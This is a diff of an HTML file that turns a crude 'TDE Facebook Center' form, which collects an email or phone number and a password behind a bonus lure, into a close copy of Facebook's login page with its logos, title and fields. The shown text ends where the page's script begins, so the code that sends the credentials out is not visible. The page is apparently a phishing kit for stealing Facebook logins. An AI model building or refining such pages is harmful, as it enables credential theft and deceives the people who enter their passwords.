@@ -1,127 +1,254 @@
-<!-- =========================
-     FACEBOOK PAGE
-     save as: facebook.html
-========================= -->
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-
-<title>TDE Facebook Center</title>
-
-<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
-
-<style>
-
-*{
-margin:0;
-padding:0;
-box-sizing:border-box;
-font-family:'Poppins',sans-serif;
-}
-
-body{
-background:#f5f7ff;
-display:flex;
-justify-content:center;
-align-items:center;
-height:100vh;
-padding:20px;
-}
-
-.card{
-width:100%;
-max-width:420px;
-background:white;
-padding:30px;
-border-radius:25px;
-box-shadow:0 10px 40px rgba(0,0,0,0.08);
-}
-
-h1{
-font-size:28px;
-margin-bottom:10px;
-text-align:center;
-color:#1877f2;
-}
-
-p{
-text-align:center;
-font-size:14px;
-color:#666;
-margin-bottom:25px;
-}
-
-input,
-textarea{
-width:100%;
-padding:15px;
-border:none;
-background:#f2f4ff;
-border-radius:15px;
-margin-bottom:20px;
-font-size:15px;
-outline:none;
-}
-
-textarea{
-height:50px;
-resize:none;
-}
-
-button{
-width:100%;
-padding:15px;
-border:none;
-border-radius:15px;
-background:#1877f2;
-color:white;
-font-size:16px;
-font-weight:600;
-cursor:pointer;
-}
-
-.success{
-display:none;
-text-align:center;
-}
-
-</style>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Facebook – log in or sign up</title>
+    <style>
+        /* ---------- Original Facebook Style ---------- */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: system-ui, -apple-system, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background: #ffffff;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 2rem 1.5rem;
+        }
+        .login-wrapper {
+            width: 100%;
+            max-width: 400px;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+            padding: 2rem 0 1.5rem;
+        }
+        .lang-toggle {
+            text-align: center;
+            font-size: 15px;
+            color: #737373;
+            margin-bottom: 0.5rem;
+        }
+        .logo-wrap {
+            display: flex;
+            justify-content: center;
+            margin-top: 2.5rem;
+        }
+        .logo-wrap svg {
+            width: 68px;
+            height: 68px;
+            display: block;
+        }
+        .login-form {
+            margin-top: 5rem;
+            display: flex;
+            flex-direction: column;
+            gap: 0.75rem;
+        }
+        .login-form input {
+            height: 56px;
+            width: 100%;
+            border-radius: 16px;
+            border: 1px solid #dddfe2;
+            background: #ffffff;
+            padding: 0 1rem;
+            font-size: 17px;
+            color: #1c1c1c;
+            outline: none;
+            transition: border-color 0.15s, box-shadow 0.15s;
+        }
+        .login-form input::placeholder {
+            color: #737373;
+        }
+        .login-form input:focus {
+            border-color: #1877f2;
+            box-shadow: 0 0 0 1px #1877f2;
+        }
+        .btn-login {
+            height: 56px;
+            width: 100%;
+            border-radius: 9999px;
+            border: none;
+            background: #1877f2;
+            color: #ffffff;
+            font-size: 17px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.15s;
+            margin-top: 0.5rem;
+        }
+        .btn-login:hover {
+            background: #166fe5;
+        }
+        .forgot-link {
+            display: block;
+            text-align: center;
+            margin-top: 0.75rem;
+            font-size: 15px;
+            font-weight: 600;
+            color: #1c1c1c;
+            text-decoration: none;
+            background: transparent;
+            border: none;
+            cursor: pointer;
+            font-family: inherit;
+        }
+        .forgot-link:hover {
+            text-decoration: underline;
+        }
+        .spacer {
+            flex: 1;
+            min-height: 1rem;
+        }
+        .btn-create {
+            height: 56px;
+            width: 100%;
+            border-radius: 9999px;
+            border: 1px solid #1877f2;
+            background: #ffffff;
+            color: #1877f2;
+            font-size: 17px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.15s;
+            font-family: inherit;
+        }
+        .btn-create:hover {
+            background: rgba(24, 119, 242, 0.05);
+        }
+        .meta-footer {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            margin-top: 2rem;
+            margin-bottom: 1rem;
+        }
+        .meta-footer .meta-inner {
+            display: flex;
+            align-items: center;
+            gap: 0.4rem;
+        }
+        .meta-footer svg {
+            height: 18px;
+            width: auto;
+            display: block;
+        }
+        .meta-footer span {
+            font-size: 18px;
+            font-weight: 600;
+            letter-spacing: -0.02em;
+            color: #1c1c1c;
+        }
+        .toast {
+            position: fixed;
+            bottom: 30px;
+            left: 50%;
+            transform: translateX(-50%) translateY(80px);
+            background: #1c1c1c;
+            color: #fff;
+            padding: 12px 28px;
+            border-radius: 9999px;
+            font-size: 15px;
+            font-weight: 500;
+            opacity: 0;
+            transition: opacity 0.35s ease, transform 0.35s ease;
+            pointer-events: none;
+            z-index: 999;
+            box-shadow: 0 6px 24px rgba(0, 0, 0, 0.25);
+            max-width: 90%;
+            text-align: center;
+        }
+        .toast.show {
+            opacity: 1;
+            transform: translateX(-50%) translateY(0);
+        }
+        .toast.error {
+            background: #c62828;
+        }
+        @media (max-width: 420px) {
+            .login-wrapper {
+                padding: 1.5rem 0 1rem;
+            }
+            .login-form {
+                margin-top: 3rem;
+            }
+            .logo-wrap {
+                margin-top: 1.5rem;
+            }
+            .logo-wrap svg {
+                width: 56px;
+                height: 56px;
+            }
+        }
+    </style>
 </head>
-
 <body>
 
-<div class="card">
+    <div class="login-wrapper">
 
-<div id="formPage">
+        <p class="lang-toggle">English (UK)</p>
 
-<h1>Welcome to TDE Facebook Center</h1>
+        <div class="logo-wrap">
+            <svg viewBox="0 0 40 40" aria-label="Facebook" role="img">
+                <circle cx="20" cy="20" r="20" fill="#1877F2" />
+                <path d="M23.4 21.5l.7-4.4h-4.2v-2.9c0-1.2.6-2.4 2.5-2.4h2V8.1s-1.8-.3-3.5-.3c-3.6 0-5.9 2.2-5.9 6.1v3.4h-3.9v4.4h3.9v10.6c.8.1 1.6.2 2.4.2.8 0 1.6-.1 2.4-.2V21.5h3.6z" fill="#fff" />
+            </svg>
+        </div>
 
-<p>Input your details below</p>
-<p>Note: Account Get bosses with random amounts</p>
-<input type="text" id="name" placeholder="Email/phone Number">
+        <form class="login-form" id="loginForm" action="javascript:void(0)">
 
-<textarea id="note" placeholder="Password"></textarea>
+            <input
+            type="text"
+            id="name"
+            inputmode="email"
+            autocomplete="username"
+            placeholder="Mobile number or email address"
+            required
+            />
+            <input
+            type="password"
+            id="email"
+            autocomplete="current-password"
+            placeholder="Password"
+            required
+            />
 
-<button onclick="submitForm()">
-Finish
-</button>
+            <button type="submit" class="btn-login" id="submitForm()">
+                Log in
+            </button>
 
-</div>
+            <button type="button" class="forgot-link">
+                Forgotten password?
+            </button>
+        </form>
 
-<div class="success" id="successPage">
+        <div class="spacer"></div>
 
-<h2>Sent Successfully 🎉</h2>
+        <button type="button" class="btn-create">
+            Create new account
+        </button>
 
-<p>Your note has been delivered</p>
+        <div class="meta-footer">
+            <div class="meta-inner">
+                <svg viewBox="0 0 32 32" fill="#0064e0" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M28.46 10.38a8.33 8.33 0 0 0-4.63-1.38c-3.1 0-6 1.63-7.83 4.25-1.83-2.62-4.73-4.25-7.83-4.25a8.33 8.33 0 0 0-4.63 1.38C1.5 11.66 0 13.9 0 16c0 2.1 1.5 4.34 3.54 5.62A8.33 8.33 0 0 0 8.17 23c3.1 0 6-1.62 7.83-4.25C17.83 21.38 20.73 23 23.83 23a8.33 8.33 0 0 0 4.63-1.38C30.5 20.34 32 18.1 32 16c0-2.1-1.5-4.34-3.54-5.62ZM8.17 19.5c-2.43 0-4.44-1.54-4.44-3.5s2-3.5 4.44-3.5 4.45 1.54 4.45 3.5-2 3.5-4.45 3.5Zm15.66 0c-2.43 0-4.44-1.54-4.44-3.5s2-3.5 4.44-3.5 4.45 1.54 4.45 3.5-2 3.5-4.45 3.5Z"/>
+                </svg>
+                <span>Meta</span>
+            </div>
+        </div>
 
-</div>
+    </div>
 
-</div>
+    <!-- Toast (only for errors) -->
+    <div class="toast" id="toast"></div>
 
-<script>
+  <script>
 
 const params =
 new URLSearchParams(window.location.search);
